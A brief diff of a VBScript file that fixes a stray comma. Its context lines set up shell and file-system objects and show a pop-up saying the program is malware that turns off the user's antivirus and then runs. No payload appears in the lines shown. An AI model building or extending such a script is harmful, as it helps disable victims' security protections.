@@ -1,4 +1,4 @@
-DIM FSO, MyFile, 
+DIM FSO, MyFile
 Set oShell = CreateObject("WScript.Shell")
 Set FSO = CreateObject("Scripting.FileSystemObject")
 answer = MsgBox("Disclaimer: Our program does consist of a malware, this malwares function is to turn off your antivirus and run this program. Knowing this information would you like to proceed?", vbQuestion + vbYesNo + vbDefaultButton2, "!!!WARNING!!!")
